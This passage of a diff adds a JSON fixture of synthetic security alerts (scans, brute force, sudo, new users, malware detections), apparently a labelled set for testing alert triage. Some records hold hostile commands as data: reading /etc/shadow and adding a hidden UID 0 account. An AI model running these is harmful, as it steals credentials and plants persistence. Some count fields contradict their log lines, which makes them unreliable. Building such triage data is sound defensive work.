+      "ip": "10.0.3.30"
+    },
+    "data": {
+      "srcip": "203.0.113.182",
+      "ports_probed": 2337
+    },
+    "full_log": "Port scan from 203.0.113.182 against 10.0.3.30",
+    "ground_truth": {
+      "label": "malicious",
+      "scenario": "external_scan",
+      "rationale": "Unknown external IP scanning a public server: reconnaissance."
+    }
+  },
+  {
+    "id": "N-088",
+    "timestamp": "2026-11-04T07:32:00Z",
+    "rule": {
+      "id": "100300",
+      "level": 12,
+      "description": "Large outbound data transfer.",
+      "groups": [
+        "network",
+        "exfiltration"
+      ]
+    },
+    "agent": {
+      "name": "files-01",
+      "ip": "10.0.4.40"
+    },
+    "data": {
+      "srcip": "10.0.4.40",
+      "dstip": "10.0.4.41",
+      "bytes_out_mb": 5314,
+      "srcuser": "svc_backup"
+    },
+    "full_log": "netflow: 10.0.4.40 -> 10.0.4.41 5314 MB (svc_backup nightly job)",
+    "ground_truth": {
+      "label": "benign",
+      "scenario": "nightly_backup",
+      "rationale": "Transfer to the approved backup target by the backup service account."
+    }
+  },
+  {
+    "id": "N-089",
+    "timestamp": "2026-11-03T10:47:00Z",
+    "rule": {
+      "id": "5402",
+      "level": 3,
+      "description": "Successful sudo to ROOT executed.",
+      "groups": [
+        "syslog",
+        "sudo"
+      ]
+    },
+    "agent": {
+      "name": "dc-01",
+      "ip": "10.0.5.50"
+    },
+    "data": {
+      "srcuser": "it_admin",
+      "command": "/usr/bin/journalctl -u sshd"
+    },
+    "full_log": "sudo: it_admin : TTY=pts/0 ; PWD=/home/it_admin ; USER=root ; COMMAND=/usr/bin/journalctl -u sshd",
+    "ground_truth": {
+      "label": "benign",
+      "scenario": "admin_sudo",
+      "rationale": "Known admin running routine maintenance during work hours."
+    }
+  },
+  {
+    "id": "N-090",
+    "timestamp": "2026-11-03T18:47:00Z",
+    "rule": {
+      "id": "2902",
+      "level": 7,
+      "description": "New dpkg (Debian Package) installed.",
+      "groups": [
+        "syslog",
+        "dpkg",
+        "config_changed"
+      ]
+    },
+    "agent": {
+      "name": "db-01",
+      "ip": "10.0.2.20"
+    },
+    "data": {
+      "package": "libc6",
+      "srcuser": "it_admin",
+      "source": "updates.example.com"
+    },
+    "full_log": "dpkg: status installed libc6 (source updates.example.com, change ticket CHG-8306)",
+    "ground_truth": {
+      "label": "benign",
+      "scenario": "package_update",
+      "rationale": "Routine patch from the approved update domain with a change ticket."
+    }
+  },
+  {
+    "id": "N-091",
+    "timestamp": "2026-11-04T15:40:00Z",
+    "rule": {
+      "id": "40112",
+      "level": 12,
+      "description": "Multiple authentication failures followed by a success.",
+      "groups": [
+        "syslog",
+        "authentication_success",
+        "attack"
+      ]
+    },
+    "agent": {
+      "name": "web-01",
+      "ip": "10.0.1.10"
+    },
+    "data": {
+      "srcip": "203.0.113.2",
+      "srcuser": "kpatel",
+      "failures_before_success": 60
+    },
+    "full_log": "sshd: Accepted password for kpatel from 203.0.113.2 after repeated failures",
+    "ground_truth": {
+      "label": "malicious",
+      "scenario": "bruteforce_success",
+      "rationale": "External IP succeeded after many failures: likely compromised account."
+    }
+  },
+  {
+    "id": "N-092",
+    "timestamp": "2026-11-04T15:36:00Z",
+    "rule": {
+      "id": "5712",
+      "level": 10,
+      "description": "sshd: brute force trying to get access to the system. Non existent user.",
+      "groups": [
+        "syslog",
+        "sshd",
+        "authentication_failures"
+      ]
+    },
+    "agent": {
+      "name": "mail-01",
+      "ip": "10.0.3.30"
+    },
+    "data": {
+      "srcip": "198.51.100.92",
+      "srcuser": "oracle",
+      "attempts": 129
+    },
+    "full_log": "sshd: 48 failed logins for invalid users from 198.51.100.92 within 120s",
+    "ground_truth": {
+      "label": "malicious",
+      "scenario": "ssh_bruteforce_external",
+      "rationale": "Many failed logins for non-existent users from an external IP."
+    }
+  },
+  {
+    "id": "N-093",
+    "timestamp": "2026-11-06T00:25:00Z",
+    "rule": {
+      "id": "100210",
+      "level": 10,
+      "description": "DNS query to domain on threat-intel blocklist.",
+      "groups": [
+        "dns",
+        "threat_intel"
+      ]
+    },
+    "agent": {
+      "name": "ws-001",
+      "ip": "10.0.10.1"
+    },
+    "data": {
+      "query": "update-check.invalid-cdn.test",
+      "srcip": "10.0.10.1"
+    },
+    "full_log": "dns: 10.0.10.1 queried update-check.invalid-cdn.test (matched threat feed)",
+    "ground_truth": {
+      "label": "malicious",
+      "scenario": "dns_threat_intel",
+      "rationale": "Workstation contacted a domain on a threat-intelligence blocklist."
+    }
+  },
+  {
+    "id": "N-094",
+    "timestamp": "2026-11-03T14:23:00Z",
+    "rule": {
+      "id": "5902",
+      "level": 8,
+      "description": "New user added to the system.",
+      "groups": [
+        "syslog",
+        "adduser"
+      ]
+    },
+    "agent": {
+      "name": "dc-01",
+      "ip": "10.0.5.50"
+    },
+    "data": {
+      "srcuser": "it_admin",
+      "dstuser": "creyes",
+      "hour_local": 9
+    },
+    "full_log": "useradd: new user: name=creyes, UID=1872 (created by it_admin, ticket HR-4628)",
+    "ground_truth": {
+      "label": "benign",
+      "scenario": "onboarding_new_user",
+      "rationale": "Admin creating a normal account in work hours with an HR ticket."
+    }
+  },
+  {
+    "id": "N-095",
+    "timestamp": "2026-11-06T01:50:00Z",
+    "rule": {
+      "id": "100210",
+      "level": 10,
+      "description": "DNS query to domain on threat-intel blocklist.",
+      "groups": [
+        "dns",
+        "threat_intel"
+      ]
+    },
+    "agent": {
+      "name": "ws-018",
+      "ip": "10.0.10.18"
+    },
+    "data": {
+      "query": "files-share.dl-mirror.test",
+      "srcip": "10.0.10.18"
+    },
+    "full_log": "dns: 10.0.10.18 queried files-share.dl-mirror.test (matched threat feed)",
+    "ground_truth": {
+      "label": "malicious",
+      "scenario": "dns_threat_intel",
+      "rationale": "Workstation contacted a domain on a threat-intelligence blocklist."
+    }
+  },
+  {
+    "id": "N-096",
+    "timestamp": "2026-11-03T01:12:00Z",
+    "rule": {
+      "id": "31101",
+      "level": 5,
+      "description": "Web server 400 error code.",
+      "groups": [
+        "web",
+        "accesslog"
+      ]
+    },
+    "agent": {
+      "name": "web-02",
+      "ip": "10.0.1.11"
+    },
+    "data": {
+      "srcip": "203.0.113.131",
+      "url": "/favicon.ico",
+      "status": "404",
+      "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15"
+    },
+    "full_log": "203.0.113.131 - - \"GET /favicon.ico HTTP/1.1\" 404",
+    "ground_truth": {
+      "label": "benign",
+      "scenario": "web_404",
+      "rationale": "Ordinary missing-page request from a normal browser."
+    }
+  },
+  {
+    "id": "N-097",
+    "timestamp": "2026-11-03T21:22:00Z",
+    "rule": {
+      "id": "100211",
+      "level": 3,
+      "description": "DNS query to newly observed domain.",
+      "groups": [
+        "dns"
+      ]
+    },
+    "agent": {
+      "name": "ws-032",
+      "ip": "10.0.10.32"
+    },
+    "data": {
+      "query": "updates.example.com",
+      "srcip": "10.0.10.32"
+    },
+    "full_log": "dns: 10.0.10.32 queried updates.example.com (first seen today)",
+    "ground_truth": {
+      "label": "benign",
+      "scenario": "dns_known_good",
+      "rationale": "Domain is on the approved domain list."
+    }
+  },
+  {
+    "id": "N-098",
+    "timestamp": "2026-11-03T05:46:00Z",
+    "rule": {
+      "id": "5402",
+      "level": 3,
+      "description": "Successful sudo to ROOT executed.",
+      "groups": [
+        "syslog",
+        "sudo"
+      ]
+    },
+    "agent": {
+      "name": "web-02",
+      "ip": "10.0.1.11"
+    },
+    "data": {
+      "srcuser": "it_admin",
+      "command": "/usr/bin/systemctl restart nginx"
+    },
+    "full_log": "sudo: it_admin : TTY=pts/0 ; PWD=/home/it_admin ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx",
+    "ground_truth": {
+      "label": "benign",
+      "scenario": "admin_sudo",
+      "rationale": "Known admin running routine maintenance during work hours."
+    }
+  },
+  {
+    "id": "N-099",
+    "timestamp": "2026-11-05T16:12:00Z",
+    "rule": {
+      "id": "5902",
+      "level": 8,
+      "description": "New user added to the system.",
+      "groups": [
+        "syslog",
+        "adduser"
+      ]
+    },
+    "agent": {
+      "name": "dc-01",
+      "ip": "10.0.5.50"
+    },
+    "data": {
+      "srcuser": "dwilson",
+      "dstuser": "helpdesk_tmp",
+      "hour_local": 3
+    },
+    "full_log": "useradd[6233]: new user: name=helpdesk_tmp, UID=0 (created by dwilson at night)",
+    "ground_truth": {
+      "label": "malicious",
+      "scenario": "offhours_new_root_user",
+      "rationale": "Non-admin creating a UID 0 account at night: persistence."
+    }
+  },
+  {
+    "id": "N-100",
+    "timestamp": "2026-11-03T04:26:00Z",
+    "rule": {
+      "id": "31101",
+      "level": 5,
+      "description": "Web server 400 error code.",
+      "groups": [
+        "web",
+        "accesslog"
+      ]
+    },
+    "agent": {
+      "name": "web-01",
+      "ip": "10.0.1.10"
+    },
+    "data": {
+      "srcip": "203.0.113.124",
+      "url": "/images/logo2.png",
+      "status": "404",
+      "user_agent": "Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0"
+    },
+    "full_log": "203.0.113.124 - - \"GET /images/logo2.png HTTP/1.1\" 404",
+    "ground_truth": {
+      "label": "benign",
+      "scenario": "web_404",
+      "rationale": "Ordinary missing-page request from a normal browser."
+    }
+  },
+  {
+    "id": "N-101",
+    "timestamp": "2026-11-02T12:50:00Z",
+    "rule": {
+      "id": "5716",
+      "level": 5,
+      "description": "sshd: authentication failed.",
+      "groups": [
+        "syslog",
+        "sshd",
+        "authentication_failed"
+      ]
+    },
+    "agent": {
+      "name": "db-01",
+      "ip": "10.0.2.20"
+    },
+    "data": {
+      "srcip": "10.0.10.22",
+      "srcuser": "lchen"
+    },
+    "full_log": "sshd[8546]: Failed password for lchen from 10.0.10.22 port 60764 ssh2",
+    "ground_truth": {
+      "label": "benign",
+      "scenario": "single_failed_login",
+      "rationale": "One failed login from an internal workstation by a known employee; typo."
+    }
+  },
+  {
+    "id": "N-102",
+    "timestamp": "2026-11-05T13:44:00Z",
+    "rule": {
+      "id": "5902",
+      "level": 8,
+      "description": "New user added to the system.",
+      "groups": [
+        "syslog",
+        "adduser"
+      ]
+    },
+    "agent": {
+      "name": "dc-01",
+      "ip": "10.0.5.50"
+    },
+    "data": {
+      "srcuser": "hali",
+      "dstuser": "sysupd",
+      "hour_local": 1
+    },
+    "full_log": "useradd[4297]: new user: name=sysupd, UID=0 (created by hali at night)",
+    "ground_truth": {
+      "label": "malicious",
+      "scenario": "offhours_new_root_user",
+      "rationale": "Non-admin creating a UID 0 account at night: persistence."
+    }
+  },
+  {
+    "id": "N-103",
+    "timestamp": "2026-11-03T22:47:00Z",
+    "rule": {
+      "id": "100211",
+      "level": 3,
+      "description": "DNS query to newly observed domain.",
+      "groups": [
+        "dns"
+      ]
+    },
+    "agent": {
+      "name": "ws-023",
+      "ip": "10.0.10.23"
+    },
+    "data": {
+      "query": "cdn.example.com",
+      "srcip": "10.0.10.23"
+    },
+    "full_log": "dns: 10.0.10.23 queried cdn.example.com (first seen today)",
+    "ground_truth": {
+      "label": "benign",
+      "scenario": "dns_known_good",
+      "rationale": "Domain is on the approved domain list."
+    }
+  },
+  {
+    "id": "N-104",
+    "timestamp": "2026-11-04T23:20:00Z",
+    "rule": {
+      "id": "40101",
+      "level": 8,
+      "description": "Port scan detected.",
+      "groups": [
+        "firewall",
+        "recon"
+      ]
+    },
+    "agent": {
+      "name": "web-02",
+      "ip": "10.0.1.11"
+    },
+    "data": {
+      "srcip": "203.0.113.113",
+      "ports_probed": 252
+    },
+    "full_log": "Port scan from 203.0.113.113 against 10.0.1.11",
+    "ground_truth": {
+      "label": "malicious",
+      "scenario": "external_scan",
+      "rationale": "Unknown external IP scanning a public server: reconnaissance."
+    }
+  },
+  {
+    "id": "N-105",
+    "timestamp": "2026-11-03T07:30:00Z",
+    "rule": {
+      "id": "5402",
+      "level": 3,
+      "description": "Successful sudo to ROOT executed.",
+      "groups": [
+        "syslog",
+        "sudo"
+      ]
+    },
+    "agent": {
+      "name": "db-01",
+      "ip": "10.0.2.20"
+    },
+    "data": {
+      "srcuser": "netops",
+      "command": "/usr/bin/journalctl -u sshd"
+    },
+    "full_log": "sudo: netops : TTY=pts/0 ; PWD=/home/netops ; USER=root ; COMMAND=/usr/bin/journalctl -u sshd",
+    "ground_truth": {
+      "label": "benign",
+      "scenario": "admin_sudo",
+      "rationale": "Known admin running routine maintenance during work hours."
+    }
+  },
+  {
+    "id": "N-106",
+    "timestamp": "2026-11-03T09:32:00Z",
+    "rule": {
+      "id": "5402",
+      "level": 3,
+      "description": "Successful sudo to ROOT executed.",
+      "groups": [
+        "syslog",
+        "sudo"
+      ]
+    },
+    "agent": {
+      "name": "web-01",
+      "ip": "10.0.1.10"
+    },
+    "data": {
+      "srcuser": "it_admin",
+      "command": "/usr/bin/systemctl restart nginx"
+    },
+    "full_log": "sudo: it_admin : TTY=pts/0 ; PWD=/home/it_admin ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx",
+    "ground_truth": {
+      "label": "benign",
+      "scenario": "admin_sudo",
+      "rationale": "Known admin running routine maintenance during work hours."
+    }
+  },
+  {
+    "id": "N-107",
+    "timestamp": "2026-11-03T15:07:00Z",
+    "rule": {
+      "id": "2902",
+      "level": 7,
+      "description": "New dpkg (Debian Package) installed.",
+      "groups": [
+        "syslog",
+        "dpkg",
+        "config_changed"
+      ]
+    },
+    "agent": {
+      "name": "web-02",
+      "ip": "10.0.1.11"
+    },
+    "data": {
+      "package": "nginx",
+      "srcuser": "it_admin",
+      "source": "updates.example.com"
+    },
+    "full_log": "dpkg: status installed nginx (source updates.example.com, change ticket CHG-3953)",
+    "ground_truth": {
+      "label": "benign",
+      "scenario": "package_update",
+      "rationale": "Routine patch from the approved update domain with a change ticket."
+    }
+  },
+  {
+    "id": "N-108",
+    "timestamp": "2026-11-05T19:08:00Z",
+    "rule": {
+      "id": "87105",
+      "level": 12,
+      "description": "VirusTotal: Alert - file detected as malicious by multiple engines.",
+      "groups": [
+        "virustotal"
+      ]
+    },
+    "agent": {
+      "name": "ws-022",
+      "ip": "10.0.10.22"
+    },
+    "data": {
+      "file": "C:\\Users\\hali\\Downloads\\invoice_2026.pdf.exe",
+      "positives": 25,
+      "total": 70
+    },
+    "full_log": "VirusTotal: invoice_2026.pdf.exe flagged by 58/70 engines",
+    "ground_truth": {
+      "label": "malicious",
+      "scenario": "malware_download",
+      "rationale": "File flagged by many AV engines on a workstation."
+    }
+  },
+  {
+    "id": "N-109",
+    "timestamp": "2026-11-03T17:10:00Z",
+    "rule": {
+      "id": "2902",
+      "level": 7,
+      "description": "New dpkg (Debian Package) installed.",
+      "groups": [
+        "syslog",
+        "dpkg",
+        "config_changed"
+      ]
+    },
+    "agent": {
+      "name": "mail-01",
+      "ip": "10.0.3.30"
+    },
+    "data": {
+      "package": "nginx",
+      "srcuser": "it_admin",
+      "source": "updates.example.com"
+    },
+    "full_log": "dpkg: status installed nginx (source updates.example.com, change ticket CHG-9174)",
+    "ground_truth": {
+      "label": "benign",
+      "scenario": "package_update",
+      "rationale": "Routine patch from the approved update domain with a change ticket."
+    }
+  },
+  {
+    "id": "N-110",
+    "timestamp": "2026-11-05T00:21:00Z",
+    "rule": {
+      "id": "40101",
+      "level": 8,
+      "description": "Port scan detected.",
+      "groups": [
+        "firewall",
+        "recon"
+      ]
+    },
+    "agent": {
+      "name": "web-01",
+      "ip": "10.0.1.10"
+    },
+    "data": {
+      "srcip": "203.0.113.115",
+      "ports_probed": 1758
+    },
+    "full_log": "Port scan from 203.0.113.115 against 10.0.1.10",
+    "ground_truth": {
+      "label": "malicious",
+      "scenario": "external_scan",
+      "rationale": "Unknown external IP scanning a public server: reconnaissance."
+    }
+  },
+  {
+    "id": "N-111",
+    "timestamp": "2026-11-05T15:14:00Z",
+    "rule": {
+      "id": "5902",
+      "level": 8,
+      "description": "New user added to the system.",
+      "groups": [
+        "syslog",
+        "adduser"
+      ]
+    },
+    "agent": {
+      "name": "files-01",
+      "ip": "10.0.4.40"
+    },
+    "data": {
+      "srcuser": "sowusu",
+      "dstuser": "sysupd",
+      "hour_local": 1
+    },
+    "full_log": "useradd[8848]: new user: name=sysupd, UID=0 (created by sowusu at night)",
+    "ground_truth": {
+      "label": "malicious",
+      "scenario": "offhours_new_root_user",
+      "rationale": "Non-admin creating a UID 0 account at night: persistence."
+    }
+  },
+  {
+    "id": "N-112",
+    "timestamp": "2026-11-04T04:17:00Z",
+    "rule": {
+      "id": "100300",
+      "level": 12,
+      "description": "Large outbound data transfer.",
+      "groups": [
+        "network",
+        "exfiltration"
+      ]
+    },
+    "agent": {
+      "name": "db-01",
+      "ip": "10.0.2.20"
+    },
+    "data": {
+      "srcip": "10.0.2.20",
+      "dstip": "10.0.4.41",
+      "bytes_out_mb": 13962,
+      "srcuser": "svc_backup"
+    },
+    "full_log": "netflow: 10.0.2.20 -> 10.0.4.41 13962 MB (svc_backup nightly job)",
+    "ground_truth": {
+      "label": "benign",
+      "scenario": "nightly_backup",
+      "rationale": "Transfer to the approved backup target by the backup service account."
+    }
+  },
+  {
+    "id": "N-113",
+    "timestamp": "2026-11-03T23:46:00Z",
+    "rule": {
+      "id": "100211",
+      "level": 3,
+      "description": "DNS query to newly observed domain.",
+      "groups": [
+        "dns"
+      ]
+    },
+    "agent": {
+      "name": "ws-030",
+      "ip": "10.0.10.30"
+    },
+    "data": {
+      "query": "cdn.example.com",
+      "srcip": "10.0.10.30"
+    },
+    "full_log": "dns: 10.0.10.30 queried cdn.example.com (first seen today)",
+    "ground_truth": {
+      "label": "benign",
+      "scenario": "dns_known_good",
+      "rationale": "Domain is on the approved domain list."
+    }
+  },
+  {
+    "id": "N-114",
+    "timestamp": "2026-11-05T07:13:00Z",
+    "rule": {
+      "id": "5402",
+      "level": 3,
+      "description": "Successful sudo to ROOT executed.",
+      "groups": [
+        "syslog",
+        "sudo"
+      ]
+    },
+    "agent": {
+      "name": "files-01",
+      "ip": "10.0.4.40"
+    },
+    "data": {
+      "srcuser": "mgarcia",
+      "command": "/bin/cat /etc/shadow"
+    },
+    "full_log": "sudo: mgarcia : TTY=pts/1 ; USER=root ; COMMAND=/bin/cat /etc/shadow",
+    "ground_truth": {
+      "label": "malicious",
+      "scenario": "suspicious_sudo",
+      "rationale": "Non-admin running a credential-theft or download-and-run command as root."
+    }
+  },
+  {
+    "id": "N-115",
+    "timestamp": "2026-11-03T03:10:00Z",
+    "rule": {
+      "id": "31101",
+      "level": 5,
+      "description": "Web server 400 error code.",
+      "groups": [
+        "web",
+        "accesslog"
+      ]
+    },
+    "agent": {
+      "name": "web-01",
+      "ip": "10.0.1.10"
+    },
+    "data": {
+      "srcip": "198.51.100.12",
+      "url": "/favicon.ico",
+      "status": "404",
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0 Safari/537.36"
+    },
+    "full_log": "198.51.100.12 - - \"GET /favicon.ico HTTP/1.1\" 404",
+    "ground_truth": {
+      "label": "benign",
+      "scenario": "web_404",
+      "rationale": "Ordinary missing-page request from a normal browser."
+    }
+  },
+  {
+    "id": "N-116",
+    "timestamp": "2026-11-04T22:08:00Z",
+    "rule": {
+      "id": "40101",
+      "level": 8,
+      "description": "Port scan detected.",
+      "groups": [
+        "firewall",
+        "recon"
+      ]
+    },
+    "agent": {
+      "name": "mail-01",
+      "ip": "10.0.3.30"
+    },
+    "data": {
+      "srcip": "203.0.113.202",
+      "ports_probed": 2930
+    },
+    "full_log": "Port scan from 203.0.113.202 against 10.0.3.30",
+    "ground_truth": {
+      "label": "malicious",
+      "scenario": "external_scan",
+      "rationale": "Unknown external IP scanning a public server: reconnaissance."
+    }
+  },
+  {
+    "id": "N-117",
+    "timestamp": "2026-11-04T07:45:00Z",
+    "rule": {
+      "id": "100300",
+      "level": 12,
+      "description": "Large outbound data transfer.",
+      "groups": [
+        "network",
+        "exfiltration"
+      ]
+    },
+    "agent": {
+      "name": "files-01",
+      "ip": "10.0.4.40"
+    },
+    "data": {
+      "srcip": "10.0.4.40",
+      "dstip": "10.0.4.41",
+      "bytes_out_mb": 16305,
+      "srcuser": "svc_backup"
+    },
+    "full_log": "netflow: 10.0.4.40 -> 10.0.4.41 16305 MB (svc_backup nightly job)",
+    "ground_truth": {
+      "label": "benign",
+      "scenario": "nightly_backup",
+      "rationale": "Transfer to the approved backup target by the backup service account."
+    }
+  },
+  {
+    "id": "N-118",
+    "timestamp": "2026-11-05T21:27:00Z",
+    "rule": {
+      "id": "87105",
+      "level": 12,
+      "description": "VirusTotal: Alert - file detected as malicious by multiple engines.",
+      "groups": [
+        "virustotal"
+      ]
+    },
+    "agent": {
+      "name": "ws-037",
+      "ip": "10.0.10.37"
+    },
+    "data": {
+      "file": "C:\\Users\\lchen\\Downloads\\scan001.js",
+      "positives": 42,
+      "total": 70
+    },
+    "full_log": "VirusTotal: scan001.js flagged by 54/70 engines",
+    "ground_truth": {
+      "label": "malicious",
+      "scenario": "malware_download",
+      "rationale": "File flagged by many AV engines on a workstation."
+    }
+  },
+  {
+    "id": "N-119",
+    "timestamp": "2026-11-05T20:23:00Z",
+    "rule": {
+      "id": "87105",
+      "level": 12,
+      "description": "VirusTotal: Alert - file detected as malicious by multiple engines.",
+      "groups": [
+        "virustotal"
+      ]
+    },
+    "agent": {
+      "name": "ws-030",
+      "ip": "10.0.10.30"
+    },
+    "data": {
+      "file": "C:\\Users\\jsmith\\Downloads\\scan001.js",
+      "positives": 56,
+      "total": 70
+    },
+    "full_log": "VirusTotal: scan001.js flagged by 56/70 engines",
+    "ground_truth": {
+      "label": "malicious",
+      "scenario": "malware_download",
+      "rationale": "File flagged by many AV engines on a workstation."
+    }
+  },
+  {
+    "id": "N-120",
+    "timestamp": "2026-11-05T12:19:00Z",
+    "rule": {
+      "id": "5402",
+      "level": 3,
+      "description": "Successful sudo to ROOT executed.",
+      "groups": [
+        "syslog",
+        "sudo"
+      ]
+    },
+    "agent": {
+      "name": "db-01",
+      "ip": "10.0.2.20"
+    },
+    "data": {
+      "srcuser": "sowusu",
+      "command": "/usr/sbin/useradd -o -u 0 sysupd"
+    },
+    "full_log": "sudo: sowusu : TTY=pts/1 ; USER=root ; COMMAND=/usr/sbin/useradd -o -u 0 sysupd",
+    "ground_truth": {
+      "label": "malicious",
+      "scenario": "suspicious_sudo",
+      "rationale": "Non-admin running a credential-theft or download-and-run command as root."
+    }
+  },
+  {
+    "id": "N-121",
+    "timestamp": "2026-11-04T10:44:00Z",
+    "rule": {
+      "id": "5712",
+      "level": 10,
+      "description": "sshd: brute force trying to get access to the system. Non existent user.",
+      "groups": [
+        "syslog",
+        "sshd",
+        "authentication_failures"
+      ]
+    },
+    "agent": {
+      "name": "web-01",
+      "ip": "10.0.1.10"
+    },
+    "data": {
+      "srcip": "203.0.113.104",
+      "srcuser": "admin",
+      "attempts": 175
+    },
+    "full_log": "sshd: 126 failed logins for invalid users from 203.0.113.104 within 120s",
+    "ground_truth": {
+      "label": "malicious",
+      "scenario": "ssh_bruteforce_external",
+      "rationale": "Many failed logins for non-existent users from an external IP."
+    }
+  },
+  {
+    "id": "N-122",
+    "timestamp": "2026-11-04T02:52:00Z",
+    "rule": {
+      "id": "100300",
+      "level": 12,
+      "description": "Large outbound data transfer.",
+      "groups": [
+        "network",
+        "exfiltration"
+      ]
+    },
+    "agent": {
+      "name": "files-01",
+      "ip": "10.0.4.40"
+    },
+    "data": {
+      "srcip": "10.0.4.40",
+      "dstip": "10.0.4.41",
+      "bytes_out_mb": 12454,
+      "srcuser": "svc_backup"
+    },
+    "full_log": "netflow: 10.0.4.40 -> 10.0.4.41 12454 MB (svc_backup nightly job)",
+    "ground_truth": {
+      "label": "benign",
+      "scenario": "nightly_backup",
+      "rationale": "Transfer to the approved backup target by the backup service account."
+    }
+  }
+]
